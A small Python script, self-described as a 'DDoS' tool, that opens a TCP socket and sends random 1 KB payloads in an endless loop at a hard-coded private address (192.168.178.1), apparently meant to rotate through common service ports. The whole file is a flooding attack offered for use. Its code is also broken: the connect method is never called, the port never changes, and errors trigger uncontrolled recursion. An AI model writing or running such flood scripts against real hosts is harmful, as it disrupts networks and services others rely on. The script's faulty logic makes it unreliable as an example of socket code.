#!/bin/python

import os
import socket
import time


class DDoS:
    def __init__(self, target_address, target_port):
        self.target_address = target_address
        self.target_port = target_port
        self.list_of_open_ports = [53, 80, 139, 443, 445, 5060, 8089, 8181]
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.spam_target()

    def connect_to_server(self, port):
        try:
            self.s.connect((self.target_address, port))
        except (ConnectionRefusedError, ConnectionResetError):
            time.sleep(5)

    def spam_target(self):
        random_bytes = os.urandom(1024)
        sent = 0
        loop_count = 0
        port = self.list_of_open_ports[loop_count]
        while True:
            try:
                self.s.sendto(random_bytes, ('192.168.178.1', port))
                sent += 1
                print(str(sent) + ' packets sent...')
            except BrokenPipeError as e:
                print('Broken pip ' + str(e))
                loop_count += 1
                time.sleep(10)
                if loop_count == 7:
                    loop_count = 0
                else:
                    self.spam_target()


if __name__ == '__main__':
    test = DDoS('192.168.178.1', 80)
